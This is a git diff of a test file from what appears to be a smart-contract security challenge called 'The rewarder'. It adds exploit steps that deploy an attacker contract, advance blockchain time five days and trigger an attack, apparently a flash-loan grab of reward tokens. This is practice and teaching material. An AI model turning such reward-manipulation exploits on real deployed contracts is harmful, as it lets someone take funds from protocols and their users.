@@ -66,11 +66,15 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-    });
+        const RewardAttacker = await ethers.getContractFactory('RewardAttacker', attacker);
+        this.rewardAttacker = await RewardAttacker.deploy(this.flashLoanPool.address, this.rewarderPool.address, this.liquidityToken.address, this.rewardToken.address);
 
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        await this.rewardAttacker.connect(attacker).attack();
+    });
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
         // Only one round should have taken place
         expect(
             await this.rewarderPool.roundNumber()
